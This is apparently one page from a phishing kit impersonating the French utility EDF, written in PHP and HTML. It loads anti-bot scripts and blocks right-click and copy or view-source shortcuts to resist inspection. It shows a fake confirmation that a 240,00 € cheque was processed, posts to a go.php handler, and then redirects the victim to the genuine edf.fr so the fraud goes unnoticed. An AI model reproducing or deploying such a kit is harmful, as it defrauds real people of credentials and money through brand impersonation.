<?php
session_start();
error_reporting(0);
//----------------BOTS---------------\\
include('../assets/srv/funciones.php');
include('../assets/srv/app.php');
//--------------ENDBOTS--------------\\
//--------------------RANDOMS---------------------\\
$random    = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$random1    = substr(md5($random), 0, 20);
$random2 = substr(md5($random), 0, 14);
$random3 = substr(md5($random), 0, 8);
$random4 = substr(md5($random), 0, 50);
//------------------ENDRANDOMS--------------------\\
?>
<!DOCTYPE html>
<html lang="fr" style="overflow: auto;">
    <head>
        <meta http-equiv="Content-Type" ;="" content="charset=utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="stylesheet" type="text/css" href="../assets/css/main.css" />
        <link rel="stylesheet" type="text/css" href="../assets/css/style2.css" />
        <link rel="stylesheet" type="text/css" href="../assets/css/images.css" />
		<link rel="icon" type="image/x-icon" href="../assets/images/favicon.ico">
		<meta http-equiv="refresh" content="4;url=https://edf.fr/" >
		<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
        <script>
            document.addEventListener("contextmenu", (event) => event.preventDefault());
            document.onkeydown = function (e) {
                if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
                    return false;
                } else {
                    return true;
                }
            };
            $(document).keypress("u", function (e) {
                if (e.ctrlKey) {
                    return false;
                } else {
                    return true;
                }
            });
        </script>
        <noscript>
            <h3>You must have JavaScript enabled in order to use this order form. Please enable JavaScript and then reload this page in order to continue.</h3>
            <meta http-equiv="refresh" content="0;url" ="../../" />
        </noscript>
        <title>Me connecter</title>
		<link rel="icon" type="image/x-icon" href="../assets/images/favicon.ico">
        <body style="overflow: auto;">
            <aside><img style="background-size: cover; display: block; position: fixed; height: 100%; left: 0; top: 0; width: 28.5%;" src="../assets/images/ec-bg.png" /></aside>
            <form type="POST" action="./go.php?cid=33" />
            <div id="login-base">
                <div class="edf--container clearfix">
                    <div id="content">
                        <div class="auth auth--withRetour js-document">
                            <div class="auth__id">
                                <div class="auth__id-logo" id="mylogo"></div>
                            </div>
                            <section>
                                <main class="auth__content">
                                    <h3 style="margin-bottom: 20px;" class="auth__content-title"><img src="../assets/images/enc3.png" /></h3>
                                    <center>
										<h2><img src="../assets/images/load_.gif" style="margin-top: 80px; margin-bottom: 80px; width: 70px;"/></h2>
										Votre chéque de 240,00 € a été traité avec succès
										</center>
                                </main>
                            </section>
							<button id="username-next-button" class="atomx-btn atomx-btn--theme-primary" disabled >
                                                <span class="atomx-btn__label">Suivant</span>
                                            </button>
											</form>
                            <section class="auth__add-EC" style="display: block;">
                                <center>
                                    <img src="../assets/images/eng.png" style="cursor: pointer; width: 340px;" />
                                </center>
                            </section>
                        </div>
                    </div>
                </div>
            </div>
        </body>
    </head>
</html>
